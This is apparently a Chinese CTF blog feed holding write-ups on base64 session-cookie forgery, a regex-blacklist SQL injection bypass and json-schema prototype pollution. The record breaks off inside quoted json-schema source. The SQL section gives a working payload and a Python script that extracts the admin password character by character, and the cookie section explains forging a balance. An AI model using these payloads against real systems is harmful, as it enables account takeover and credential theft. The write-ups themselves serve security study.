    <content type="html"><![CDATA[<h1 id="简单的cookie伪造"><a href="#简单的cookie伪造" class="headerlink" title="简单的cookie伪造"></a>简单的cookie伪造</h1><p>打开页面发现，是一个购买的界面，可以看见第三个是购买flag的，打开页面源码，发现没有什么提示，所以我们点击购买，然后抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /buy HTTP/1.1</span><br><span class="line">Host: 8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Origin: http://8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81/</span><br><span class="line">Cookie: UM_distinctid=17c472616a335b-0660cc5b8058a1-4c3e2778-186a00-17c472616a43f; session=eyJtb25leSI6IDM3LCAiaGlzdG9yeSI6IFsiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IHBlcHBhcmtha2EiLCAiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSJdfQ==</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">id=2</span><br></pre></td></tr></table></figure><p>发现有一个session字段，且值是base64加密的，所以base64解密后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;money&quot;: 37, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy pepparkaka&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</span><br></pre></td></tr></table></figure><p>因此，我们可以修改37为500，然后伪造cookie中的session字段并提交，得到回馈的seesion字段，我们再base64解密一下即可得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;money&quot;: 400, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy pepparkaka&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;flag&#123;d1ca8b7e-27c5-415b-a858-0c9d22826c21&#125;\n&quot;]&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简单的cookie伪造&quot;&gt;&lt;a href=&quot;#简单的cookie伪造&quot; class=&quot;headerlink&quot; title=&quot;简单的cookie伪造&quot;&gt;&lt;/a&gt;简单的cookie伪造&lt;/h1&gt;&lt;p&gt;打开页面发现，是一个购买的界面，可以看见第三个是购买flag的，打开</summary>
      
    
    
    
    
    <category term="ssrf" scheme="http://example.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>正则过滤</title>
    <link href="http://example.com/2021/10/02/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2021/10/02/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</id>
    <published>2021-10-01T16:00:00.000Z</published>
    <updated>2021-10-02T19:13:06.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正则过滤"><a href="#正则过滤" class="headerlink" title="正则过滤"></a>正则过滤</h1><p>打开页面，发现是一个登录的界面，其中下面有sql语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>所以我们fuzz一下，发现大部分符号被过滤掉了，然后我们可以尝试构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br></pre></td></tr></table></figure><p>User-agent: *<br>Disallow: /hint.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后构造hint.txt，可以看见</span><br></pre></td></tr></table></figure><p>$black_list = “/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|&#39;|=| |in|&lt;|&gt;|-|.|()|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i”;</p><p>If $_POST[‘passwd’] === admin’s password,</p><p>Then you will get the flag;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以看见只要密码正确就可以读取flag，但是许多符号被过滤，但是我们可以使用</span><br></pre></td></tr></table></figure><p>select * from users where username=’’ || password regexp ‘^a’;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">的sql语句的格式来让服务器获取username和password来进行比对，其中regexp &#x27;^a&#x27;是正则匹配，意思是获取password字段中开头字母为a的值，其中我们可以在mysql库中来验证这句sql语句</span><br><span class="line"></span><br><span class="line">首先，我们先</span><br></pre></td></tr></table></figure><p>mysql -u root -p root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进入到mysql库中，然后</span><br></pre></td></tr></table></figure><p>show databases;     //查看数据库</p><p>use test;                  //选择数据库</p><p>create table table1 (id int(10),name varchar(20));    //建立数据表</p><p>insert into table1 values(‘1’,’hbb’);<br>insert into table1 values(‘2’,’hrc’);                        //向table1插入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后执行</span><br></pre></td></tr></table></figure><p>select * from table1 where id=3 || name regexp ‘^hr’;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">会显示table1中id为2，name为hrc，所以我们可以构造payload</span><br></pre></td></tr></table></figure><p>username=\&amp;passwd=||/<strong>/passwd/</strong>/regexp/**/‘^a’;%00</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其中/**/是代替被过滤的空格，而%00为截断符号，截断后面的单引号，作用相当于#或--+，由于黑名单中有%00，所以不可以在输入框中提交，要抓包后，post提交，而\\是先转义一条反斜杠，然后剩下的一条反斜杠就会把单引号给转义掉，从而使username为\&#x27; and password</span><br></pre></td></tr></table></figure><p>select * from users where username=’&#39; and password=’||/<strong>/passwd/</strong>/regexp/**/‘^a’;%00’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当密码正确时，返回的包中有welcome的字眼，所以我们可以以此来写exp</span><br></pre></td></tr></table></figure><p>import requests<br>import string<br>url = “<a href="http://5f80822e-bbf0-4050-ba1b-6fc9c1783ad4.node3.buuoj.cn/&quot;">http://5f80822e-bbf0-4050-ba1b-6fc9c1783ad4.node3.buuoj.cn/&quot;</a><br>str_list = string.ascii_lowercase + string.ascii_uppercase + string.digits + “_”</p><p>password= “”<br>while(True):<br>    for j in str_list :<br>        data = {<br>            “username” : “\“,<br>            “passwd” : ‘||/<em>1</em>/passwd/<em>2</em>/regexp/<em>3</em>/“^%s”;%s’ % (password+j,chr(0))<br>        }<br>        r = requests.post(url,data=data)<br>        if(“welcome” in r.text):<br>            password += j<br>            print(password)<br>            break</p><p>```<br>最后得到密码并直接提交即可得到flag</p><p>参考文章：[<a href="https://zhuanlan.zhihu.com/p/106088835]">https://zhuanlan.zhihu.com/p/106088835]</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;正则过滤&quot;&gt;&lt;a href=&quot;#正则过滤&quot; class=&quot;headerlink&quot; title=&quot;正则过滤&quot;&gt;&lt;/a&gt;正则过滤&lt;/h1&gt;&lt;p&gt;打开页面，发现是一个登录的界面，其中下面有sql语句&lt;/p&gt;
&lt;figure class=&quot;highlight plaint</summary>
      
    
    
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>json_schema原型链污染(nodejs)</title>
    <link href="http://example.com/2021/10/01/json_schema%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://example.com/2021/10/01/json_schema%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2021-09-30T16:00:00.000Z</published>
    <updated>2021-10-01T16:51:33.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="json-schema原型链污染"><a href="#json-schema原型链污染" class="headerlink" title="json_schema原型链污染"></a>json_schema原型链污染</h1><h2 id="json-schema"><a href="#json-schema" class="headerlink" title="json_schema"></a>json_schema</h2><h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><p>json是表示javaScript对象表示法，是一种简单的数据交换格式，现在已经被运用于许多不涉及web环境中</p><h4 id="json的数据结构"><a href="#json的数据结构" class="headerlink" title="json的数据结构"></a>json的数据结构</h4><ol><li><p>object</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>array</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;first&quot;,&quot;secode&quot;,&quot;third&quot;]</span><br></pre></td></tr></table></figure></li><li><p>number</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">42</span><br></pre></td></tr></table></figure></li><li><p>string</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;this is a string&quot;</span><br></pre></td></tr></table></figure></li><li><p>boolean</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">true</span><br><span class="line">false</span><br></pre></td></tr></table></figure></li><li><p>null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">null</span><br></pre></td></tr></table></figure></li></ol><p>使用这些简单的数据类型可以表示各种结构化数据，以下为用json以不同的方式表示一个人的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;George Washington&quot;,</span><br><span class="line">  &quot;birthday&quot;: &quot;February 22, 1732&quot;,</span><br><span class="line">  &quot;address&quot;: &quot;Mount Vernon, Virginia, United States&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;first_name&quot;: &quot;George&quot;,</span><br><span class="line">  &quot;last_name&quot;: &quot;Washington&quot;,</span><br><span class="line">  &quot;birthday&quot;: &quot;1732-02-22&quot;,</span><br><span class="line">  &quot;address&quot;: &#123;</span><br><span class="line">    &quot;street_address&quot;: &quot;3200 Mount Vernon Memorial Highway&quot;,</span><br><span class="line">    &quot;city&quot;: &quot;Mount Vernon&quot;,</span><br><span class="line">    &quot;state&quot;: &quot;Virginia&quot;,</span><br><span class="line">    &quot;country&quot;: &quot;United States&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而json_schema就是让应用程序知道该json记录的组织形式，下面就是上面json结构的数据用json_schema结构表达的实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">  &quot;properties&quot;: &#123;</span><br><span class="line">    &quot;first_name&quot;: &#123; &quot;type&quot;: &quot;string&quot; &#125;,</span><br><span class="line">    &quot;last_name&quot;: &#123; &quot;type&quot;: &quot;string&quot; &#125;,</span><br><span class="line">    &quot;birthday&quot;: &#123; &quot;type&quot;: &quot;string&quot;, &quot;format&quot;: &quot;date&quot; &#125;,</span><br><span class="line">    &quot;address&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;street_address&quot;: &#123; &quot;type&quot;: &quot;string&quot; &#125;,</span><br><span class="line">        &quot;city&quot;: &#123; &quot;type&quot;: &quot;string&quot; &#125;,</span><br><span class="line">        &quot;state&quot;: &#123; &quot;type&quot;: &quot;string&quot; &#125;,</span><br><span class="line">        &quot;country&quot;: &#123; &quot;type&quot; : &quot;string&quot; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由以上例子，我们可以知道json_schema是用json编写的，它本身的数据，是描述其它数据结构的格式声明，而且会自动验证数据，但是由于json_schema不可以包含任意代码，数据元素之间的关系存在某些不能表达的约束，所以验证阶段有了两个级别，分别是schema级别和语义级别</p><h4 id="json模式的规范"><a href="#json模式的规范" class="headerlink" title="json模式的规范"></a>json模式的规范</h4><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表示应用于json模式的json文档</span><br></pre></td></tr></table></figure><p>模式关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个json模式必须是一个对象或布尔值，而应用于实例的对象属性则称为关键字或模式关键字</span><br></pre></td></tr></table></figure><p>验证关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json模式可用于要求给定的实例满足一定数量的条件，而用于断言这些条件的关键字则被称为验证关键字</span><br></pre></td></tr></table></figure><p>而验证关键字有很多种，这里主要注重对象的验证关键字的properties和additionalProperties</p><h5 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h5><p>此关键字的值必须是一个对象，这个对象中的每一个值都必须是一个有效的json模式，而且是用来验证对象实例中的子实例，而不是验证这个对象实例本身，对于同时出现在实例和作为该关键字的值中的名称的每个名称，该名称的子实例成功通过对应模式的验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">  &quot;properties&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;string&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;age&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;number&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="additionalProperties"><a href="#additionalProperties" class="headerlink" title="additionalProperties"></a>additionalProperties</h4><p>此关键字的值必须是一个有效的json模式或一个布尔值，用来验证对象实例中的子实例，而不是验证这个对象实例本身，而且只验证实例中名称即不匹配properties中的任何名，也不匹配patternProperties中的任何正则表达式的元素的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;_name&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;age_&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;number&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;salary&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;number&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;required&quot;: [</span><br><span class="line">        &quot;_name&quot;,</span><br><span class="line">        &quot;age_&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;patternProperties&quot;: &#123;</span><br><span class="line">        &quot;^_&quot;: &#123;</span><br><span class="line">            &quot;minLength&quot;: 3</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;_$&quot;: &#123;</span><br><span class="line">            &quot;multipleOf&quot;: 10</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;additionalProperties&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: [&quot;string&quot;, &quot;number&quot;],</span><br><span class="line">        &quot;enum&quot;: [&#x27;SQA&#x27;, &quot;R&amp;D&quot;, &quot;IMP&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[json_schema详细][<a href="https://blog.csdn.net/swinfans/article/details/89231247]">https://blog.csdn.net/swinfans/article/details/89231247]</a></p><h2 id="实例-绿城杯Looking-for-treasure"><a href="#实例-绿城杯Looking-for-treasure" class="headerlink" title="实例(绿城杯Looking for treasure)"></a>实例(绿城杯Looking for treasure)</h2><p>打开页面，查看页面源码，发现一个可疑点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/source.zip</span><br></pre></td></tr></table></figure><p>可以得到config.js文件<br>config.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function(app, fs, lodash)&#123;</span><br><span class="line">    app.get(&#x27;/config&#x27;, function(req, res, next) &#123;</span><br><span class="line">        let config = res.locals.config;</span><br><span class="line">        let content = JSON.parse(fs.readFileSync(config.filepath).toString())</span><br><span class="line">        res.json(content);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    app.post(&#x27;/validated/:library?/:method?&#x27;, function(req, res, next) &#123;</span><br><span class="line">        let config = res.locals.config;</span><br><span class="line">        if (!req.params.library || req.params.library.match(/vm/i)|| req.params.library.match(/../i)|| req.params.library.match(/%2f/i)|| req.params.library.match(/%2F/i)|| req.params.library.match(/\//i)) req.params.library = &quot;json-schema&quot;</span><br><span class="line">        if (!req.params.method) req.params.method = &quot;validate&quot;</span><br><span class="line"></span><br><span class="line">        let json_library = require(req.params.library)</span><br><span class="line">        let valid = json_library[req.params.method](req.body)</span><br><span class="line">        if (!valid) &#123;</span><br><span class="line">            res.send(&quot;validator failed&quot;);</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">        let p;</span><br><span class="line">        if (config.path) &#123;</span><br><span class="line">            p = config.path;</span><br><span class="line">        &#125; else if (config.filepath) &#123;</span><br><span class="line">            p = config.filepath;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            p = &quot;config.json&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        let content = fs.readFileSync(p).toString()</span><br><span class="line">        try &#123;</span><br><span class="line">            content = JSON.parse(content)</span><br><span class="line">            if (lodash.isEqual(req.body, content))</span><br><span class="line">                res.json(content)</span><br><span class="line">            else</span><br><span class="line">                res.send(&#123; &quot;validator&quot;: valid, &quot;content&quot; : content, &quot;log&quot;: &quot;wrong content&quot;&#125;)</span><br><span class="line">        &#125; catch &#123;</span><br><span class="line">            res.send(&#123; &quot;validator&quot;: valid, &quot;content&quot; : content&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源码中我们可以看见</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.params.library = &quot;json-schema&quot;</span><br></pre></td></tr></table></figure><p>可以判断是json_schema，然后我们从上面可知道，json_schema会自动验证数据，所以我们下载json_schema的源码，然后看validate.js文件</p><p>validate.js文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * JSONSchema Validator - Validates JavaScript objects using JSON Schemas</span><br><span class="line"> *(http://www.json.com/json-schema-proposal/)</span><br><span class="line"> * Licensed under AFL-2.1 OR BSD-3-Clause</span><br><span class="line">To use the validator call the validate function with an instance object and an optional schema object.</span><br><span class="line">If a schema is provided, it will be used to validate. If the instance object refers to a schema (self-validating),</span><br><span class="line">that schema will be used to validate and the schema parameter is not necessary (if both exist,</span><br><span class="line">both validations will occur).</span><br><span class="line">The validate method will return an array of validation errors. If there are no errors, then 